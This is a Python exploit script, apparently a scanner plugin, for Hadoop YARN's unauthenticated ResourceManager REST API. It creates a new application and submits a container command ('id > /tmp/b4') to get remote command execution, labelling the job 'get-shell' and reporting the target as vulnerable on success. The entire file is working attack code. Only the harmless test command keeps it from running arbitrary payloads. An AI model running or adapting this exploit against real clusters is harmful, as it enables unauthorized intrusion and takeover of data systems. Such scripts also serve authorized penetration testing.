import json
from typing import Optional

import requests

from lib.log import logger


def run(url: str) -> Optional[str]:
    """Exploit Hadoop YARN unauthorized access vulnerability."""
    try:
        # Step 1: Create new application
        app_url = f"{url}:8088/ws/v1/cluster/apps/new-application"
        logger.info(f"Creating new application at {app_url}")
        response1 = requests.post(app_url, verify=False, timeout=5)
        app_id = response1.json()['application-id']
        logger.info(f"Application ID: {app_id}")

        # Step 2: Submit application with command
        submit_url = f"{url}:8088/ws/v1/cluster/apps"
        payload = {
            'application-id': app_id,
            'application-name': 'get-shell',
            'am-container-spec': {
                'commands': {
                    'command': 'id > /tmp/b4',
                },
            },
            'application-type': 'YARN',
        }
        logger.info(f"Submitting application at {submit_url}")
        response2 = requests.post(submit_url, json=payload, verify=False, timeout=5)
        if response2.status_code == 202:
            logger.success("Hadoop YARN unauth Vulnerable")
            return "Hadoop YARN unauth Vulnerable"
        logger.warning(f"Failed, status code: {response2.status_code}")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        logger.error(f"JSON decode failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None


if __name__ == "__main__":
    print(run("http://192.168.27.136"))
